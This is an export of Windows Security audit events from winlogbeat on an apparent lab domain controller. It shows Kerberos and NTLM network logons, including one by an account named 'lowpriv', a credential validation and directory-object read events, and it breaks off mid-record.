"May 28, 2026 @ 21:03:11.524"	"ahDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x6496A9
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.251
	Source Port:		50487

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.251"	50487	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x6496a9	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110041	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:02:49.744"	"aRDAb54ByrYY_kgL4O4A"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:02:50.938"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x64903F
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	127.0.0.1
	Source Port:		50484

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"127.0.0.1"	50484	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x64903f	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"2,120"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110029	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:02:40.357"	"aBDAb54ByrYY_kgL4O4A"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:02:41.931"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-3984567624-304424726-3877085034-1103
	Account Name:		lowpriv
	Account Domain:		LAB2019
	Logon ID:		0x648ED5
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.218
	Source Port:		40000

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	NTLM	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.218"	40000	128	"NTLM V2"	"{00000000-0000-0000-0000-000000000000}"	" - "	"NtLmSsp "	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	LAB2019	0x0	0x648ed5	"'-"	"'-"	lowpriv	"S-1-5-21-3984567624-304424726-3877085034-1103"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,136"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110022	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:02:40.356"	"ZxDAb54ByrYY_kgL4O4A"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Credential Validation"	4776	"May 28, 2026 @ 21:02:41.931"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:	lowpriv
Source Workstation:	
Error Code:	0x0"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	lowpriv	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4776	"Audit Success"	Info	644	"3,136"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110021	"Credential Validation"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:58.609"	"ZhDAb54ByrYY_kgLO-7Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:01:59.908"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109978	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:58.609"	"ZRDAb54ByrYY_kgLO-7Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:01:59.908"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109977	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:58.609"	"ZBDAb54ByrYY_kgLO-7Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:01:59.908"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109976	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:58.609"	"YxDAb54ByrYY_kgLO-7Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:01:59.908"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109975	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:58.609"	"YhDAb54ByrYY_kgLO-7Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:01:59.908"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109974	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:58.609"	"YRDAb54ByrYY_kgLO-7Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:01:59.908"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{3f975da2-8525-425d-8d71-78ffeff16ea1}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{3f975da2-8525-425d-8d71-78ffeff16ea1}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109973	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:58.609"	"YBDAb54ByrYY_kgLO-7Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:01:59.908"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{3f975da2-8525-425d-8d71-78ffeff16ea1}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		READ_CONTROL
				
	Access Mask:		0x20000
	Properties:		READ_CONTROL
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%1538
				"	0x20000	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{3f975da2-8525-425d-8d71-78ffeff16ea1}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%1538
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109972	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:58.609"	"XxDAb54ByrYY_kgLO-7Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:01:59.908"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109971	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:01:49.747"	"XhC_b54ByrYY_kgL9e51"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:01:50.894"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x647715
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	127.0.0.1
	Source Port:		50480

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
